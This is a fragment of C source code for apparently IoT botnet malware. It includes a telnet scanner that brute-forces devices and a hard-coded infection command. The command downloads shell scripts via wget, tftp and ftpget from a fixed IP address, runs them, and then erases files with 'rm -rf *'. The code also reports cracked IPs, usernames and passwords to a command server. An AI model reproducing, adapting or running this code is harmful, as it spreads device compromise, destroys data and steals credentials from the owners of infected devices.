...
char *infectline = "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://198.167.140.10/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 198.167.140.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 198.167.140.10; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.167.140.10 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
...
void echoLoader()
{
        ...
        int fd;
        fd = socket_connect("198.167.140.10", 80); 
...
void TelnetScanner()
{
        ...
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        ...
                        case 9:
                                {
                                    if(send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://198.167.140.10/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 198.167.140.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 198.167.140.10; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.167.140.10 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                        ...
                        case 12:
                                {
                                    ...
                                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                    {
										fds[i].totalTimeout = 0;
										fds[i].bufUsed = 0;
										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://198.167.140.10/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 198.167.140.10 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 198.167.140.10; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.167.140.10 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
										continue;
